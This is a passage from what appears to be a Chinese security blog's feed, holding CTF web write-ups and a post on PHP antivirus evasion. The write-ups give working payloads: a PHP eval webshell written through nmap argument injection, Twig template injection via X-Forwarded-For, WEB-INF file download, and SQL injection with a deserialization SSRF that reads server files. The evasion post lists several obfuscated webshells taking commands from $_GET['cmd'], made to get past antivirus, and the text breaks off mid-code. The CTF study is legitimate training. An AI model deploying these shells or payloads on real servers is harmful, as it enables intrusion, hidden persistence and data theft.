href="https://blog.csdn.net/qq_43085611/article/details/119523915">浅谈CTF中escapeshellarg的利用_slug01sh的博客-CSDN博客_escapeshellarg</a></p><p><a href="https://paper.seebug.org/164/">PHP escapeshellarg()+escapeshellcmd() 之殇 (seebug.org)</a></p></blockquote><p>关键的地方在：</p><ol><li>传入的参数是：<code>172.17.0.2&#39; -v -d a=1</code></li><li>经过<code>escapeshellarg</code>处理后变成了<code>&#39;172.17.0.2&#39;\&#39;&#39; -v -d a=1&#39;</code>，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</li><li>经过<code>escapeshellcmd</code>处理后变成<code>&#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;</code>，这是因为<code>escapeshellcmd</code>对<code>\</code>以及最后那个<strong>不配对儿</strong>的引号进行了转义：<a href="http://php.net/manual/zh/function.escapeshellcmd.php">http://php.net/manual/zh/function.escapeshellcmd.php</a></li><li>最后执行的命令是<code>curl &#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;</code>，由于中间的<code>\\</code>被解释为<code>\</code>而不再是转义字符，所以后面的<code>&#39;</code>没有被转义，与再后面的<code>&#39;</code>配对儿成了一个空白连接符。所以可以简化为<code>curl 172.17.0.2\ -v -d a=1&#39;</code>，即向<code>172.17.0.2\</code>发起请求，POST 数据为<code>a=1&#39;</code>。</li></ol><p>所以使用这样的payload（注意空格）：</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">http://80327b63-3188-4f0d-a74d-af0f1b05929d.node4.buuoj.cn:81/?host=&#x27; </span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;hack&quot;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml"> -oG hack.php &#x27;</span><br></code></pre></td></tr></table></figure><p><code>-oG</code>是nmap中写入到文件的参数；</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221223212149371.png" alt="image-20221223212149371"></p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221223212342693.png" alt="image-20221223212342693"></p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221223212411856.png" alt="image-20221223212411856"></p><blockquote><p><a href="https://blog.csdn.net/qq_26406447/article/details/100711933">BUUCTF 2018 Online Tool_恋物语战场原的博客-CSDN博客_buuctf online tool</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>ctf-web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[ctf-web] BJDCTF2020-TheMysteryOfIp</title>
    <link href="/2022/12/16/%5Bctf-web%5D%20BJDCTF2020-TheMysteryOfIp/"/>
    <url>/2022/12/16/%5Bctf-web%5D%20BJDCTF2020-TheMysteryOfIp/</url>
    
    <content type="html"><![CDATA[<h1 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h1><p>进入是一个页面</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221216212858904.png" alt="image-20221216212858904"></p><p>上面主要有两个选项，进入Flag，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221216212932209.png" alt="image-20221216212932209"></p><p>只是显示了IP，没什么东西，看下Hint，在源代码中看到提示<code>Do you know why i know your ip?</code>，I don’t know.</p><p>bp抓包，修改请求，添加<code>X-Forwarded-For</code>，发现IP变了，但是这样后面没什么头绪了。</p><p>查了下发现了PHP中的<strong>Twig模板注入漏洞</strong>，类似Flask的J<strong>injia2模板注入漏洞</strong>，操作就是：</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">X-Forwarded-For: </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">system</span>(<span class="hljs-name">&#x27;ls /&#x27;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>执行命令，然后：</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">X-Forwarded-For: </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">highlight_file</span>(<span class="hljs-name">&#x27;/flag&#x27;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>得到flag。</p><p><a href="https://www.cnblogs.com/zzjdbk/p/13049923.html">SSTI（以Twig模板引擎为例） - My_Dreams - 博客园 (cnblogs.com)</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>ctf-web</tag>
      
      <tag>ssti</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[ctf-web] RoarCTF2019-EasyJava</title>
    <link href="/2022/12/15/%5Bctf-web%5D%20RoarCTF2019-EayaJava/"/>
    <url>/2022/12/15/%5Bctf-web%5D%20RoarCTF2019-EayaJava/</url>
    
    <content type="html"><![CDATA[<h1 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h1><p>进入是登录界面，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221215221720796.png" alt="image-20221215221720796"></p><p>首先尝试登录，注入没有成功（当然因为是java没怎么尝试），发现下面的help，进入后路径是：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">6</span>dd13dba-f7ac-<span class="hljs-number">40</span>de-a4eb-<span class="hljs-number">56</span>cad5c3403b.node4.buuoj.cn:<span class="hljs-number">81</span>/Download?filename=help.docx<br></code></pre></td></tr></table></figure><p>但是显示了<code>java.io.FileNotFoundException:&#123;help.docx&#125;</code>，不过尝试了发送POST请求成功下载文件，也不是POST请求，就是把请求方法换成了POST，在hackbar选择这个，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221215222141955.png" alt="image-20221215222141955"></p><p>打开文件发现只有<code>Are you sure the flag is here? ? ?</code>这样的内容，那么就尝试下载其他的文件，javaweb中有<code>/WEB-INF/web.xml</code>文件，尝试下载，成功了，打开发现</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221215222351095.png" alt="image-20221215222351095"></p><p>尝试下载这个文件：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">6</span>dd13dba-f7ac-<span class="hljs-number">40</span>de-a4eb-<span class="hljs-number">56</span>cad5c3403b.node4.buuoj.cn:<span class="hljs-number">81</span><span class="hljs-regexp">/Download?filename=/</span>WEB-INF<span class="hljs-regexp">/classes/</span>com<span class="hljs-regexp">/wm/</span>ctf/FlagController.class<br></code></pre></td></tr></table></figure><p>不过需要反编译，<a href="http://javare.cn/">JAVA反向工程网 (javare.cn)</a></p><p>得到源码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><br><span class="hljs-meta">@WebServlet(</span><br><span class="hljs-meta">   name = &quot;FlagController&quot;</span><br><span class="hljs-meta">)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FlagController</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br><br>   <span class="hljs-type">String</span> <span class="hljs-variable">flag</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;ZmxhZ3swZTVmYjRiNy1lMzIzLTQ4NTQtOWUxNi0xMDVlNzE3OTEzZmF9Cg==&quot;</span>;<br><br><br>   <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest var1, HttpServletResponse var2)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>      <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">var3</span> <span class="hljs-operator">=</span> var2.getWriter();<br>      var3.print(<span class="hljs-string">&quot;&lt;h1&gt;Flag is nearby ~ Come on! ! !&lt;/h1&gt;&quot;</span>);<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>base64解码。</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>ctf-web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[ctf-web] 网鼎杯2018-Fakebook</title>
    <link href="/2022/12/14/%5Bctf-web%5D%20%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/"/>
    <url>/2022/12/14/%5Bctf-web%5D%20%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/</url>
    
    <content type="html"><![CDATA[<h1 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h1><p>进入的页面</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221214214846792.png" alt="image-20221214214846792"></p><p>一个是登录，一个是注册；</p><p>登录尝试注入，但是没有成功；然后注册成功了，这个blog是真的难搞，需要是一个URL地址，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221214215054078.png" alt="image-20221214215054078"></p><p>注册后就直接登录了，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221214215357610.png" alt="image-20221214215357610"></p><p>做的时候没有截图，上面用到网上的图。</p><p>点击名字就进入新的页面，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221214215507875.png" alt="image-20221214215507875"></p><p>这里URL为<code>http://4cf44b77-0f94-4b35-8be3-9105e7e1c7d0.node4.buuoj.cn:81/view.php?no=1</code>，尝试注入。</p><p>使用<code>?no=1&#39;</code>，出现错误；</p><p>使用<code>?no=1 order by 5</code>，知道有4列；</p><p>使用<code>?no=1&#39; union select 1,2,3,4</code>，触发了waf，然后使用<code>?no=-1/**/union/**/select/**/1,2,3,4</code>，成功了，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221214215756912.png" alt="image-20221214215756912"></p><p>而且这个页面有<code>unserialize()</code>函数，可能有反序列化，先记下。</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221214215906023.png" alt="image-20221214215906023"></p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221214215917006.png" alt="image-20221214215917006"></p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221214215923894.png" alt="image-20221214215923894"></p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221214215931802.png" alt="image-20221214215931802"></p><p>到了这里可能需要用到反序列化，但是不知道怎么用。</p><hr><p>目录爆破，在<code>robots.txt</code>发现了文件<code>user.php.bat</code>，下载查看源码，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$blog</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$age</span>, <span class="hljs-variable">$blog</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;age = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$age</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;blog = <span class="hljs-variable">$blog</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br><br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>        <span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-variable">$httpCode</span> = <span class="hljs-title function_ invoke__">curl_getinfo</span>(<span class="hljs-variable">$ch</span>, CURLINFO_HTTP_CODE);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$httpCode</span> == <span class="hljs-number">404</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>;<br>        &#125;<br>        <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBlogContents</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;blog);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValidBlog</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$blog</span> = <span class="hljs-variable language_">$this</span>-&gt;blog;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="hljs-variable">$blog</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>发现存在SSRF漏洞，</p><p>【*】curl_init ： 初始化一个cURL会话，供curl_setopt(), curl_exec()和curl_close() 函数使用。</p><p>【*】curl_setopt ： 请求一个url。<br>其中CURLOPT_URL表示需要获取的URL地址，后面就是跟上了它的值。</p><p>【*】CURLOPT_RETURNTRANSFER 将curl_exec()获取的信息以文件流的形式返回，而不是直接输出。</p><p>【*】curl_exec，成功时返回 TRUE， 或者在失败时返回 FALSE。 然而，如果 CURLOPT_RETURNTRANSFER选项被设置，函数执行成功时会返回执行的结果，失败时返回 FALSE 。</p><p>【*】CURLINFO_HTTP_CODE ：最后一个收到的HTTP代码。<br>curl_getinfo：以字符串形式返回它的值，因为设置了CURLINFO_HTTP_CODE，所以是返回的状态码。</p><p>如果状态码不是404，就返回exec的结果。</p><p>这里的方法<code>getBlogContents()</code>在注入时发现有，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221214220928650.png" alt="image-20221214220928650"></p><p>看到blog在第四位，所以在这里构造序列化的数据来进行SSRF，</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;UserInfo&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;123&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;i:<span class="hljs-number">123</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blog&quot;</span>;s:<span class="hljs-number">29</span>:<span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>最后构造的payload为：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">no</span>=-<span class="hljs-number">1</span> union/**/select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,&#x27;O:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;UserInfo&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;123&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;i:<span class="hljs-number">123</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blog&quot;</span>;s:<span class="hljs-number">29</span>:<span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>;&#125;&#x27;<br></code></pre></td></tr></table></figure><p>为什么是<code>/var/www/html/flag.php</code>，一种方法是经验，一种是尝试目录爆破；</p><p>为什么要这样做？既然显示的是序列化的数据，那么就存在发序列化的方法，从序列化的数据可以看到blog是第四个数据，而且根据错误提示和源码可以通过blog进行SSRF读取文件。</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>ctf-web</tag>
      
      <tag>php代码审计</tag>
      
      <tag>php反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[渗透测试] php免杀</title>
    <link href="/2022/12/13/%5B%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%5D%20php%E5%85%8D%E6%9D%80/"/>
    <url>/2022/12/13/%5B%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%5D%20php%E5%85%8D%E6%9D%80/</url>
    
    <content type="html"><![CDATA[<h1 id="php免杀"><a href="#php免杀" class="headerlink" title="php免杀"></a>php免杀</h1><p>免杀思路，通过编码、嵌套、混淆等各种手段绕过杀软检测。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;a&quot;</span>.<span class="hljs-string">&quot;s&quot;</span>.<span class="hljs-string">&quot;s&quot;</span>.<span class="hljs-string">&quot;q&quot;</span>.<span class="hljs-string">&quot;e&quot;</span>.<span class="hljs-string">&quot;q&quot;</span>.<span class="hljs-string">&quot;r&quot;</span>.<span class="hljs-string">&quot;t&quot;</span>;<br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;q&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$a</span>);<br>@<span class="hljs-variable">$a</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cmd&quot;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-variable">$a</span>);<br>&#125;<br><span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cmd&quot;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>base64解码可以过滤不认识的字符：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br><span class="hljs-variable">$ass_bs</span> = <span class="hljs-string">&quot;Y-_X&#123;&#125;NzZ&lt;XJ0&quot;</span>;<br><span class="hljs-variable">$ass</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$ass_bs</span>);<br><span class="hljs-variable">$ass</span>(<span class="hljs-variable">$a</span>);<br>&#125;<br><span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cmd&quot;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ass</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br><span class="hljs-variable">$ass_bs</span> = <span class="hljs-string">&quot;Y-_X&#123;&#125;NzZ&lt;XJ0&quot;</span>;<br><span class="hljs-variable">$ass</span> =<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$ass_bs</span>);<br><span class="hljs-variable">$ass</span>(<span class="hljs-variable">$a</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$a</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">ass</span>(<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cmd&quot;</span>]));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>添加一些无意义的<code>echo</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ass</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br><span class="hljs-variable">$ass_bs</span> = <span class="hljs-string">&quot;Y-_X&#123;&#125;NzZ&lt;XJ0&quot;</span>;<br><span class="hljs-variable">$ass</span> =<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$ass_bs</span>);<br><span class="hljs-variable">$c</span> = <span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$a</span>); <span class="hljs-comment">//$_GET[&quot;cmd&quot;]</span><br><span class="hljs-variable">$ass</span>(<span class="hljs-variable">$c</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;test&quot;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$a</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>,<span class="hljs-variable">$b</span></span>)</span>&#123;<br><span class="hljs-title function_ invoke__">ass</span>(<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cmd&quot;</span>]));<br>&#125;<br><span class="hljs-title function_ invoke__">test</span>(<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-string">&quot;@&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>,<span class="hljs-variable">$b</span></span>)</span>&#123;<br><span class="hljs-variable">$a</span>(<span class="hljs-variable">$b</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">in</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-title function_ invoke__">test</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;loader&quot;</span>],<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cmd&quot;</span>]);<br>&#125;<br><span class="hljs-title function_ invoke__">in</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>转ASCII码拼接</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ch</span>(<span class="hljs-params"><span class="hljs-variable">$arr</span></span>)</span>&#123;<br><span class="hljs-variable">$ass_arr</span>=<span class="hljs-keyword">array</span>();<br><span class="hljs-variable">$c</span> = <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">99</span>).<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">104</span>).<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">114</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$arr</span> <span class="hljs-keyword">as</span> <span 